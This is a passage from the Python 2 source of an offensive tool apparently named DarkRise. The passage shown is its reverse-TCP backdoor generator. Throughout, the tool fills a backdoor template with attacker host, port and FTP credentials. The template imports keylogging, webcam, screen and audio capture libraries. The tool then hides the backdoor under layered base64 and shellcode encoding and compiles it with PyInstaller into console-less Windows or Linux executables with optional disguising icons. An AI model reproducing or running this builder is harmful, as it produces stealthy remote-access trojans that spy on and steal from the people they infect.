                                                            os.system('python2 pyinstaller/pyinstaller.py -F --noconsole -i %s -n %s.elf %s.py' % (icon_ico,NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.elf' % (NAME))

                                                        elif icon =='no':
                                                            print('[*] Wait Moment Please Generating Payload !')
                                                            os.system('python2 pyinstaller/pyinstaller.py -F --noconsole -n %s.elf %s.py' % (NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.elf' % (NAME))

                                                    elif choice_compile =='no':
                                                        print('[*] Payload Compiled ! Save As Output %s.py' % (NAME))
                                        else:
                                            print('[!] Payload Not Found ! Sorry =(')

                    except Exception as error_run_shell:
                        print(error_run_shell)

                elif command_main.startswith('use payload/python/backdoor/reverse_tcp')==True:
                    try:
                        readline.set_completer(SimpleCompleter(['show infos','platform','set','lhost','name','lport','ftpuser','ftppass','log_dir','generate']).complete)
                        readline.parse_and_bind('tab: complete')
                        LHOST = None
                        LPORT = None
                        FTPUSER = None
                        FTPPASS = None
                        LOG_DIR = None
                        NAME = None
                        PLATFORM = None
                        while True:
                            try:
                                exploit_backdoor_rtcp = raw_input('\033[00mDark\033[1;91mRise(\033[00mpayload/backdoor/reverse_tcp\033[1;91m)\033[00m$ ')

                                if exploit_backdoor_rtcp.startswith('show infos')==True:
                                    print(' setting                                required ')
                                    print(' -------                                ---------')
                                    print(' lhost => %s                              yes    ' % (LHOST))
                                    print(' lport => %s                              yes    ' % (LPORT))
                                    print(' ftpuser => %s                            yes    ' % (FTPUSER))
                                    print(' ftppass => %s                            yes    ' % (FTPPASS))
                                    print(' log_dir => %s                            yes    ' % (LOG_DIR))
                                    print(' platform => %s                           yes    ' % (PLATFORM))
                                    print(' name => %s                               yes    ' % (NAME))
                                    print('\n')
                                    print('\n')

                                elif exploit_backdoor_rtcp.startswith('help')==True:
                                    print('set <options> <value>')
                                    print('show infos')
                                    print('generate')

                                elif exploit_backdoor_rtcp.startswith('banner')==True:
                                    choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                    choice_banner_print = random.choice(choice_banner)
                                    #clear_os()
                                    #clear_os()
                                    print(choice_banner_print)
                                    print(descrip)

                                elif exploit_backdoor_rtcp.startswith('clear')==True:
                                    clear_os()

                                elif exploit_backdoor_rtcp.startswith('set lhost')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    ip = split[2]
                                    LHOST = ip
                                    print('lhost => %s' % (LHOST))

                                elif exploit_backdoor_rtcp.startswith('back')==True:
                                    break
                                    break

                                elif exploit_backdoor_rtcp.startswith('set platform')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    platform = split[2]
                                    PLATFORM = platform
                                    print('platform => %s' % (PLATFORM))

                                elif exploit_backdoor_rtcp.startswith('set log_dir')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    log_dir = split[2]
                                    LOG_DIR = log_dir
                                    print('log_dir => %s' % (LOG_DIR))

                                elif exploit_backdoor_rtcp.startswith('set name')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    name = split[2]
                                    NAME = name
                                    print('name => %s' % (NAME))

                                elif exploit_backdoor_rtcp.startswith('set lport')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    port = split[2]
                                    LPORT = port
                                    print('lport => %s' % (LPORT))

                                elif exploit_backdoor_rtcp.startswith('set ftpuser')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    username = split[2]
                                    FTPUSER = username
                                    print('ftpuser => %s' % (FTPUSER))

                                elif exploit_backdoor_rtcp.startswith('set ftppass')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    password = split[2]
                                    FTPPASS = password
                                    print('ftppass => %s' % (FTPPASS))

                                elif exploit_backdoor_rtcp.startswith('quit')==True:
                                    sys.exit()

                                elif exploit_backdoor_rtcp.startswith('generate')==True:
                                    check_handler = os.path.exists('darkrise_backdoor.py')

                                    if check_handler ==True:
                                        if LHOST and LPORT and FTPUSER and FTPPASS and NAME and LOG_DIR and PLATFORM !=None:
                                            var_inst_payload = 'exd.py'
                                            os.system('cp darkrise_backdoor.py %s' % (var_inst_payload))
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lhost = content.replace('192.168.1.71',LHOST)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lhost)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lport = content.replace('1334',LPORT)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lport)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_ftpuser = content.replace('unamed',FTPUSER)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_ftpuser)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_ftppass = content.replace('test123',FTPPASS)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_ftppass)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_log_dir = content.replace('/home/',LOG_DIR)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_log_dir)
                                            f.close()

                                            if PLATFORM =='windows':
                                                print('[*] Platform => Windows')
                                                check_wine = os.path.exists('/usr/bin/wine')
                                                if check_wine ==True:
                                                    print('[*] Wine Found !')
                                                    check_python_path = os.path.exists('/root/.wine/drive_c/Python27')
                                                    if check_python_path ==True:
                                                        print('[*] Wine Python Path Found !')
                                                        var_inst_payload_2 = 'exd2.py'
                                                        f=open(var_inst_payload,'r')
                                                        content = f.read()
                                                        f.close()
                                                        encode_content = content.encode('base64')
                                                        f=open(var_inst_payload_2,'w')
                                                        f.write('#!/usr/bin/python2\n')
                                                        f.write('#-*- coding:utf-8 -*-\n')
                                                        f.write('import os\n')
                                                        f.write('import socket\n')
                                                        f.write('import subprocess\n')
                                                        f.write('import requests\n')
                                                        f.write('import json\n')
                                                        f.write('import sys\n')
                                                        f.write('import platform\n')
                                                        f.write('import shutil\n')
                                                        f.write('import shlex\n')
                                                        f.write('from ftplib import FTP\n')
                                                        f.write('from ftplib import FTP_TLS\n')
                                                        f.write('import cv2\n')
                                                        f.write('import time\n')
                                                        f.write('from datetime import datetime\n')
                                                        f.write('import wget\n')
                                                        f.write('import webbrowser\n')
                                                        f.write('from Crypto.Cipher import XOR\n')
                                                        f.write('import base64\n')
                                                        f.write('import thread\n')
                                                        f.write('from pynput.keyboard import Key, Listener\n')
                                                        f.write('import logging\n')
                                                        f.write('import urllib\n')
                                                        f.write('import threading\n')
                                                        f.write('import numpy as np\n')
                                                        f.write('import netifaces\n')
                                                        f.write('import pyttsx3\n')
                                                        f.write('import ctypes\n')
                                                        f.write('import glob\n')
                                                        f.write('import pyaudio\n')
                                                        f.write('import wave\n')
                                                        f.write('\n')
                                                        f.write("if 'Linux' not in platform.platform():\n")
                                                        f.write("    import win32con\n")
                                                        f.write("    from PIL import ImageGrab\n")
                                                        f.write("    from PIL import Image\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write("elif 'Windows' not in platform.platform():\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write('\n')
                                                        f.write('payload = """%s"""\n' % (encode_content))
                                                        f.write('exec(payload.decode("base64"))\n')
                                                        f.close()
                                                        cmd_shcode = subprocess.Popen('python2 sh_code.py %s' % (var_inst_payload_2), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                        shellcode_output = cmd_shcode.stdout.read() + cmd_shcode.stderr.read()
                                                        f=open('shcode.txt','w')
                                                        f.write(shellcode_output)
                                                        f.close()
                                                        os.system('rm %s ' % (var_inst_payload))
                                                        var_inst_payload_3 = 'exd3.py'
                                                        f=open(var_inst_payload_3,'w')
                                                        f.write('#!/usr/bin/python2\n')
                                                        f.write('#-*- coding:utf-8 -*-\n')
                                                        f.write('\n')
                                                        f.write('import os\n')
                                                        f.write('import socket\n')
                                                        f.write('import subprocess\n')
                                                        f.write('import requests\n')
                                                        f.write('import json\n')
                                                        f.write('import sys\n')
                                                        f.write('import platform\n')
                                                        f.write('import shutil\n')
                                                        f.write('import shlex\n')
                                                        f.write('from ftplib import FTP\n')
                                                        f.write('from ftplib import FTP_TLS\n')
                                                        f.write('import cv2\n')
                                                        f.write('import time\n')
                                                        f.write('from datetime import datetime\n')
                                                        f.write('import wget\n')
                                                        f.write('import webbrowser\n')
                                                        f.write('from Crypto.Cipher import XOR\n')
                                                        f.write('import base64\n')
                                                        f.write('import thread\n')
                                                        f.write('from pynput.keyboard import Key, Listener\n')
                                                        f.write('import logging\n')
                                                        f.write('import urllib\n')
                                                        f.write('import threading\n')
                                                        f.write('import numpy as np\n')
                                                        f.write('import netifaces\n')
                                                        f.write('import pyttsx3\n')
                                                        f.write('import ctypes\n')
                                                        f.write('import glob\n')
                                                        f.write('import pyaudio\n')
                                                        f.write('import wave\n')
                                                        f.write('\n')
                                                        f.write("if 'Linux' not in platform.platform():\n")
                                                        f.write("    import win32con\n")
                                                        f.write("    from PIL import ImageGrab\n")
                                                        f.write("    from PIL import Image\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write("elif 'Windows' not in platform.platform():\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write('\n')
                                                        f.write('payload = ""\n')
                                                        rf=open('shcode.txt','r')
                                                        content = rf.readlines()
                                                        for buffer_line in content:
                                                            buffer_line = buffer_line.rstrip()
                                                            f.write('payload += %s\n' % (buffer_line))

                                                        f.write('exec payload\n')
                                                        f.close()
                                                        print('[*] Shellcode Writed !')
                                                        f=open(var_inst_payload_3,'r')
                                                        content_shellcode = f.read()
                                                        f.close()
                                                        encode_b64 = content_shellcode.encode('base64')
                                                        var_inst_payload_4 = 'exd4.py'
                                                        f=open(var_inst_payload_4,'w')
                                                        f.write('#!/usr/bin/python2\n')
                                                        f.write('#-*- coding:utf-8 -*-\n')
                                                        f.write('\n')
                                                        f.write('import os\n')
                                                        f.write('import socket\n')
                                                        f.write('import subprocess\n')
                                                        f.write('import requests\n')
                                                        f.write('import json\n')
                                                        f.write('import sys\n')
                                                        f.write('import platform\n')
                                                        f.write('import shutil\n')
                                                        f.write('import shlex\n')
                                                        f.write('from ftplib import FTP\n')
                                                        f.write('from ftplib import FTP_TLS\n')
                                                        f.write('import cv2\n')
                                                        f.write('import time\n')
                                                        f.write('from datetime import datetime\n')
                                                        f.write('import wget\n')
                                                        f.write('import webbrowser\n')
                                                        f.write('from Crypto.Cipher import XOR\n')
                                                        f.write('import base64\n')
                                                        f.write('import thread\n')
                                                        f.write('from pynput.keyboard import Key, Listener\n')
                                                        f.write('import logging\n')
                                                        f.write('import urllib\n')
                                                        f.write('import threading\n')
                                                        f.write('import numpy as np\n')
                                                        f.write('import netifaces\n')
                                                        f.write('import pyttsx3\n')
                                                        f.write('import ctypes\n')
                                                        f.write('import glob\n')
                                                        f.write('import pyaudio\n')
                                                        f.write('import wave\n')
                                                        f.write('\n')
                                                        f.write("if 'Linux' not in platform.platform():\n")
                                                        f.write("    import win32con\n")
                                                        f.write("    from PIL import ImageGrab\n")
                                                        f.write("    from PIL import Image\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write("elif 'Windows' not in platform.platform():\n")
                                                        f.write("    import pyautogui\n")
                                                        f.write("    import imutils\n")
                                                        f.write('\n')
                                                        f.write('payload_b64 = """%s"""\n' % (encode_b64))
                                                        f.write('exec payload_b64.decode("base64")')
                                                        f.close()
                                                        print('[*] Payload Writed ! Generate')
                                                        os.system('mv %s %s.py' % (var_inst_payload_4,NAME))
                                                        os.system('rm exd2.py exd3.py shcode.txt')
                                                        choice_compile = raw_input('[*] Do You Want Compile Payload (yes/no) :> ')

                                                        if choice_compile =='yes':
                                                            icon = raw_input('[*] Do You Want Apply Icon (yes/no) :> ')

                                                            if icon =='yes':
                                                                icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                                print('[*] Wait Moment Please Generating Payload !')
                                                                os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -i %s -n %s.exe %s.py' % (icon_ico,NAME,NAME))
                                                                print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                            elif icon =='no':
                                                                print('[*] Wait Moment Please Generating Payload !')
                                                                os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -n %s.exe %s.py' % (NAME,NAME))
                                                                print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                        elif choice_compile =='no':
                                                            print('[*] Payload Compiled ! Save As Output %s.py' % (NAME))

                                                    else:
                                                        print('[!] Wine Python Not Found !')
                                                        sys.exit('[*] Please ReInstall Setup !')

                                                else:
                                                    print('[!] Wine Not Found ! Please Reinstall Setup !')

                                            elif PLATFORM =='linux':
                                                print('[*] Platform => Linux')
                                                var_inst_payload_2 = 'exd2.py'
                                                f=open(var_inst_payload,'r')
                                                content = f.read()
                                                f.close()
                                                encode_content = content.encode('base64')
                                                f=open(var_inst_payload_2,'w')
                                                f.write('#!/usr/bin/python2\n')
                                                f.write('#-*- coding:utf-8 -*-\n')
                                                f.write('import os\n')
                                                f.write('import socket\n')
                                                f.write('import subprocess\n')
                                                f.write('import requests\n')
                                                f.write('import json\n')
                                                f.write('import sys\n')
                                                f.write('import platform\n')
                                                f.write('import shutil\n')
                                                f.write('import shlex\n')
                                                f.write('from ftplib import FTP\n')
                                                f.write('from ftplib import FTP_TLS\n')
                                                f.write('import cv2\n')
                                                f.write('import time\n')
                                                f.write('from datetime import datetime\n')
                                                f.write('import wget\n')
                                                f.write('import webbrowser\n')
                                                f.write('from Crypto.Cipher import XOR\n')
                                                f.write('import base64\n')
                                                f.write('import thread\n')
                                                f.write('from pynput.keyboard import Key, Listener\n')
                                                f.write('import logging\n')
                                                f.write('import urllib\n')
                                                f.write('import threading\n')
                                                f.write('import numpy as np\n')
                                                f.write('import netifaces\n')
                                                f.write('import pyttsx3\n')
                                                f.write('import ctypes\n')
                                                f.write('import glob\n')
                                                f.write('import pyaudio\n')
                                                f.write('import wave\n')
                                                f.write('\n')
                                                f.write("if 'Linux' not in platform.platform():\n")
                                                f.write("    import win32con\n")
                                                f.write("    from PIL import ImageGrab\n")
                                                f.write("    from PIL import Image\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write("elif 'Windows' not in platform.platform():\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write('\n')
                                                f.write('payload = """%s"""\n' % (encode_content))
                                                f.write('exec(payload.decode("base64"))\n')
                                                f.close()
                                                cmd_shcode = subprocess.Popen('python2 sh_code.py %s' % (var_inst_payload_2), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                shellcode_output = cmd_shcode.stdout.read() + cmd_shcode.stderr.read()
                                                f=open('shcode.txt','w')
                                                f.write(shellcode_output)
                                                f.close()
                                                os.system('rm %s ' % (var_inst_payload))
                                                var_inst_payload_3 = 'exd3.py'
                                                f=open(var_inst_payload_3,'w')
                                                f.write('#!/usr/bin/python2\n')
                                                f.write('#-*- coding:utf-8 -*-\n')
                                                f.write('\n')
                                                f.write('import os\n')
                                                f.write('import socket\n')
                                                f.write('import subprocess\n')
                                                f.write('import requests\n')
                                                f.write('import json\n')
                                                f.write('import sys\n')
                                                f.write('import platform\n')
                                                f.write('import shutil\n')
                                                f.write('import shlex\n')
                                                f.write('from ftplib import FTP\n')
                                                f.write('from ftplib import FTP_TLS\n')
                                                f.write('import cv2\n')
                                                f.write('import time\n')
                                                f.write('from datetime import datetime\n')
                                                f.write('import wget\n')
                                                f.write('import webbrowser\n')
                                                f.write('from Crypto.Cipher import XOR\n')
                                                f.write('import base64\n')
                                                f.write('import thread\n')
                                                f.write('from pynput.keyboard import Key, Listener\n')
                                                f.write('import logging\n')
                                                f.write('import urllib\n')
                                                f.write('import threading\n')
                                                f.write('import numpy as np\n')
                                                f.write('import netifaces\n')
                                                f.write('import pyttsx3\n')
                                                f.write('import ctypes\n')
                                                f.write('import glob\n')
                                                f.write('import pyaudio\n')
                                                f.write('import wave\n')
                                                f.write('\n')
                                                f.write("if 'Linux' not in platform.platform():\n")
                                                f.write("    import win32con\n")
                                                f.write("    from PIL import ImageGrab\n")
                                                f.write("    from PIL import Image\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write("elif 'Windows' not in platform.platform():\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write('\n')
                                                f.write('payload = ""\n')
                                                rf=open('shcode.txt','r')
                                                content = rf.readlines()
                                                for buffer_line in content:
                                                    buffer_line = buffer_line.rstrip()
                                                    f.write('payload += %s\n' % (buffer_line))

                                                f.write('exec payload\n')
                                                f.close()
                                                print('[*] Shellcode Writed !')
                                                f=open(var_inst_payload_3,'r')
                                                content_shellcode = f.read()
                                                f.close()
                                                encode_b64 = content_shellcode.encode('base64')
                                                var_inst_payload_4 = 'exd4.py'
                                                f=open(var_inst_payload_4,'w')
                                                f.write('#!/usr/bin/python2\n')
                                                f.write('#-*- coding:utf-8 -*-\n')
                                                f.write('\n')
                                                f.write('import os\n')
                                                f.write('import socket\n')
                                                f.write('import subprocess\n')
                                                f.write('import requests\n')
                                                f.write('import json\n')
                                                f.write('import sys\n')
                                                f.write('import platform\n')
                                                f.write('import shutil\n')
                                                f.write('import shlex\n')
                                                f.write('from ftplib import FTP\n')
                                                f.write('from ftplib import FTP_TLS\n')
                                                f.write('import cv2\n')
                                                f.write('import time\n')
                                                f.write('from datetime import datetime\n')
                                                f.write('import wget\n')
                                                f.write('import webbrowser\n')
                                                f.write('from Crypto.Cipher import XOR\n')
                                                f.write('import base64\n')
                                                f.write('import thread\n')
                                                f.write('from pynput.keyboard import Key, Listener\n')
                                                f.write('import logging\n')
                                                f.write('import urllib\n')
                                                f.write('import threading\n')
                                                f.write('import numpy as np\n')
                                                f.write('import netifaces\n')
                                                f.write('import pyttsx3\n')
                                                f.write('import ctypes\n')
                                                f.write('import glob\n')
                                                f.write('import pyaudio\n')
                                                f.write('import wave\n')
                                                f.write('\n')
                                                f.write("if 'Linux' not in platform.platform():\n")
                                                f.write("    import win32con\n")
                                                f.write("    from PIL import ImageGrab\n")
                                                f.write("    from PIL import Image\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write('\n')
                                                f.write("elif 'Windows' not in platform.platform():\n")
                                                f.write("    import pyautogui\n")
                                                f.write("    import imutils\n")
                                                f.write('\n')
                                                f.write('payload_b64 = """%s"""\n' % (encode_b64))
                                                f.write('exec payload_b64.decode("base64")')
                                                f.close()
                                                print('[*] Payload Writed ! Generate')
                                                os.system('mv %s %s.py' % (var_inst_payload_4,NAME))
                                                os.system('rm exd2.py exd3.py shcode.txt')
                                                choice_compile = raw_input('[*] Do You Want Compile Payload (yes/no) :> ')

                                                if choice_compile =='yes':
                                                    icon = raw_input('[*] Do You Want Apply Icon (yes/no) :> ')

                                                    if icon =='yes':
                                                        icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                        print('[*] Wait Moment Please Generating Payload !')
                                                        
                                                        os.system('python2 pyinstaller/pyinstaller.py -F  -i %s -n %s.elf %s.py' % (icon_ico,NAME,NAME))
                                                        print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                    elif icon =='no':
                                                        print('[*] Wait Moment Please Generating Payload !')
                                                        os.system('python2 pyinstaller/pyinstaller.py -F  -n %s.elf %s.py' % (NAME,NAME))
                                                        print('[*] Payload Compiled ! Save As Output %s.elf' % (NAME))

                                                elif choice_compile =='no':
                                                    print('[*] Payload Compiled ! Save As Output %s.py' % (NAME))


                                        else:
                                            print('[*] Please Set Requirement Configuration !')
                                    else:
                                        print('[*] Info Not Found Payload Not Generate !')

                            except KeyboardInterrupt:
                                print('[*] CTRL + C press quit for exit !')

                    except Exception as error_backdoor_reverse_tcp:
                        print(error_backdoor_reverse_tcp)

                else:
                    print('[!] Command Not Found !')


            except KeyboardInterrupt:
                print('[*] Press CTRL+C For Exit !')

    except Exception as error_main:
        print(error_main)

if __name__ =='__main__':
    main()
